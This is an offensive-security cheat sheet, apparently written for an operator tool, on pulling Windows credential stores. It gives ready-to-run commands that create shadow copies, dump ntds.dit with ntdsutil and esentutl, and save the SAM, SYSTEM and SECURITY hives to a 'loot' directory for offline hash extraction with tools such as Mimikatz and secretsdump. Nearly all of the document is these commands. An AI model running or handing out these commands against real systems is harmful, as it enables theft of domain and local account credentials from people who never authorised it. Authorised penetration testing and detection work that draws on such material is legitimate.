---
technique: Shadow Copy Hive Acquisition
category: credential-access
targets: SAM, SYSTEM, SECURITY, NTDS.dit
protocols: Local, VSS
remote_capable: false
tags: windows credentials shadow-copy vss ntds sam system security
---

# Shadow Copy Hive Acquisition

Volume Shadow Copy Service and offline installation media workflows can acquire protected registry hives and `ntds.dit` while Windows is running. Use these methods from an elevated context and parse the files offline.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Administrative rights | VSS and hive access require elevation |
| Disk space | Shadow copies and IFM exports need local storage |
| Offline parser | Use secretsdump, Mimikatz, or pypykatz after acquisition |

## Windows

### Create shadow copy

#cmd #vss

Create a shadow copy for the `C:` volume.

```cmd title:"Create C drive shadow copy"
wmic shadowcopy call create Volume='C:\'
```
<!-- cheat -->

### List shadow copies

#cmd #vss

List available volume shadow copies.

```cmd title:"List volume shadow copies"
vssadmin list shadows
```
<!-- cheat -->

### IFM NTDS dump

#cmd #ntdsutil

Create an Install From Media copy of AD DS.

```cmd title:"Create IFM NTDS dump"
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```
<!-- cheat -->

### Copy NTDS with VSS

#cmd #vss #ntds

Copy `ntds.dit` using VSS-aware ESE tooling.

```cmd title:"Copy ntds.dit with esentutl VSS mode"
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
```
<!-- cheat -->

### Save SAM hive

#cmd #registry

Save the SAM hive for offline extraction.

```cmd title:"Save SAM hive to loot path"
reg save HKLM\SAM "$loot_dir\sam.hive"
```
<!-- cheat
var loot_dir
-->

### Save SYSTEM hive

#cmd #registry

Save the SYSTEM hive for offline extraction.

```cmd title:"Save SYSTEM hive to loot path"
reg save HKLM\SYSTEM "$loot_dir\system.hive"
```
<!-- cheat
var loot_dir
-->

### Save SECURITY hive

#cmd #registry

Save the SECURITY hive for offline LSA secret extraction.

```cmd title:"Save SECURITY hive to loot path"
reg save HKLM\SECURITY "$loot_dir\security.hive"
```
<!-- cheat
var loot_dir
-->

## Linux

No Linux operator command is included here. This note covers local Windows acquisition commands.
